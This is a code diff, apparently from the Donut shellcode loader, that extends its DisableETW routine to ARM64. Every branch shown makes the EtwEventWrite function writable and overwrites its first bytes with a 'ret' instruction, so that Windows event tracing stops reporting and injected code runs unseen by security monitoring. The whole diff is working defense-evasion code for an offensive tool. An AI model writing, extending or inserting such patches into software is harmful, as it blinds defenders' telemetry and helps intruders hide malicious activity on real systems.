@@ -375,7 +375,19 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
     if (cs == NULL) return FALSE;
 
-#ifdef _WIN64
+#if defined(_M_ARM64) || defined(__aarch64__)
+    // make the memory writeable. return FALSE on error
+    if (!inst->api.VirtualProtect(
+        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+    DPRINT("Overwriting EtwEventWrite");
+
+    // overwrite with ARM64 "ret"
+    Memcpy(cs, inst->etwRetarm64, 4);
+
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, 4, op, &t);
+#elif defined(_WIN64)
     // make the memory writeable. return FALSE on error
     if (!inst->api.VirtualProtect(
         cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
@@ -383,7 +395,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     DPRINT("Overwriting EtwEventWrite");
 
     // over write with "ret"
-    Memcpy(cs, inst->etwRet64, 1);
+    Memcpy(cs, inst->etwRetx64, 1);
 
     // set memory back to original protection
     inst->api.VirtualProtect(cs, 1, op, &t);
@@ -395,7 +407,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     DPRINT("Overwriting EtwEventWrite");
 
     // over write with "ret 14h"
-    Memcpy(cs, inst->etwRet32, 4);
+    Memcpy(cs, inst->etwRetx86, 4);
 
     // set memory back to original protection
     inst->api.VirtualProtect(cs, 4, op, &t);
